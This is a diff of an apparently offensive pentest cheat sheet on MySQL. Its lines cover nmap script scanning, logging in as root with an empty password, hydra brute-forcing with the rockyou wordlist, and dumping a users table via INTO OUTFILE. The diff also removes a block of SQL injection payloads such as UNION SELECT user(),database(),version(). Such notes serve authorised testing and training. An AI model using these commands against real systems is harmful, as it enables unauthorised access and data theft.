@@ -7,11 +7,12 @@ nmap --script=mysql-* -p 3306 $IP
 
 ## Connect to MySQL
 ```bash
-mysql -h $IP -u root
-mysql -h $IP -u root -p
+mysql -h $IP -u $USER -p --skip-ssl
 ```
 
-## Brute force MySQL with hydra
+Always check `-u root` with empty password.
+
+## Brute force MySQL
 ```bash
 hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt $IP mysql
 ```
@@ -72,12 +73,4 @@ SELECT * FROM users INTO OUTFILE '/tmp/users.csv'
 FIELDS TERMINATED BY ','
 ENCLOSED BY '"'
 LINES TERMINATED BY '\n';
-```
-
-## SQLi if the web app uses MySQL
-```text
-' OR 1=1--
-" OR 1=1--
-' UNION SELECT 1,2,3--
-' UNION SELECT user(),database(),version()--
 ```
